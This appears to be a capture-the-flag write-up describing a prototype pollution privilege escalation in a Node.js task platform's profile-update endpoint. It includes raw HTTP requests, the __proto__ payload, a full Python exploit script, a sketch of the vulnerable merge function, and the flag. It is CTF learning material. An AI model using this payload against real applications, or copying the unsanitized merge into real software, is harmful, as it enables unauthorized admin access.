# Air Quality Monitor

A new task management platform was recently launched, but
security concerns have emerged. Users can register, update
their profiles, and access their dashboard .. but there's more
beneath the surface.

## Challenge Info

- **Target:** <https://qwertyuioplk-csc26.cybersecuritychallenge.al>
- **Flag:** `CSC26{41r_qu4l1ty_m0n1t0r}`

## Challenge Description

A task management platform where users can register, update their profiles, and access their dashboard. The goal was to escalate privileges from a regular user to admin.

## Vulnerability

**Prototype Pollution** in the `/updateProfile` endpoint when using JSON content type.

## Technical Analysis

### Initial Reconnaissance

1. The application uses JWT tokens for authentication
2. JWT payload structure:

   ```json
   {
     "username": "alpetg",
     "role": "user",
     "iat": 1769772923,
     "exp": 1769776523
   }
   ```

3. The `/updateProfile` endpoint accepts a `bio` field

### Vulnerability Discovery

The Node.js backend uses an insecure object merge/assign function that doesn't sanitize `__proto__` keys. When updating a profile with JSON data, the `__proto__` property pollutes the Object prototype.

### Failed Attempts

- Mass Assignment with `role=admin` in form data ❌
- Direct role injection via form fields ❌
- NoSQL injection attempts ❌

### Successful Attack: Prototype Pollution

The backend processes JSON requests and merges user input into the user object without sanitizing dangerous keys like `__proto__`.

## Exploit Steps

### Step 1: Register a new account

```http
POST /register HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

username=attacker&email=attacker@test.com&password=Test123456!
```

### Step 2: Login to get JWT token

```http
POST /login HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com&password=Test123456!
```

### Step 3: Send Prototype Pollution payload

```http
POST /updateProfile HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Cookie: auth_token=<your_jwt_token>
Content-Type: application/json

{"bio":"hacked","__proto__":{"role":"admin"}}
```

### Step 4: Re-login to get new JWT with admin role

```http
POST /login HTTP/2
Host: qwertyuioplk-csc26.cybersecuritychallenge.al
Content-Type: application/x-www-form-urlencoded

email=attacker@test.com&password=Test123456!
```

### Step 5: Access dashboard as admin

The flag is revealed in the bio field:

```
Your role: admin
Bio: CSC26{41r_qu4l1ty_m0n1t0r}
```

## Exploit Script (Python)

```python
import requests
import json
import base64
import random
import string

BASE_URL = "https://qwertyuioplk-csc26.cybersecuritychallenge.al"

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0"})

# Generate random credentials
rand_id = ''.join(random.choices(string.digits, k=6))
email = f"exploit{rand_id}@test.com"
username = f"exploit{rand_id}"
password = "Test123456!"

# Step 1: Register
reg_data = {"username": username, "email": email, "password": password}
session.post(f"{BASE_URL}/register", data=reg_data)

# Step 2: Login
session.post(f"{BASE_URL}/login", data={"email": email, "password": password})

# Step 3: Prototype Pollution attack
pollution_payload = {"bio": "hacked", "__proto__": {"role": "admin"}}
session.post(f"{BASE_URL}/updateProfile", json=pollution_payload,
             headers={"Content-Type": "application/json"})

# Step 4: Re-login to get new JWT with admin role
session.post(f"{BASE_URL}/login", data={"email": email, "password": password})

# Step 5: Get flag from dashboard
response = session.get(f"{BASE_URL}/dashboard")
print(response.text)

# Verify JWT has admin role
auth_token = session.cookies.get('auth_token', '')
if auth_token:
    parts = auth_token.split('.')
    payload_part = parts[1] + '=' * (4 - len(parts[1]) % 4)
    decoded = json.loads(base64.b64decode(payload_part))
    print(f"JWT Role: {decoded.get('role')}")
```

## Why It Works

1. **Vulnerable Code Pattern:** The backend likely uses code like:

   ```javascript
   // Vulnerable merge function
   function merge(target, source) {
     for (let key in source) {
       target[key] = source[key]; // No sanitization!
     }
   }

   // When updating profile
   merge(user, req.body); // __proto__ gets copied!
   ```

2. **Prototype Chain:** When `__proto__` is set with `{"role": "admin"}`, it pollutes `Object.prototype`. Any object that doesn't have its own `role` property will inherit `role: "admin"`.

3. **JWT Generation:** On re-login, the server generates a new JWT. If it reads `user.role` and the user object doesn't have an explicit `role` property, it inherits from the polluted prototype.
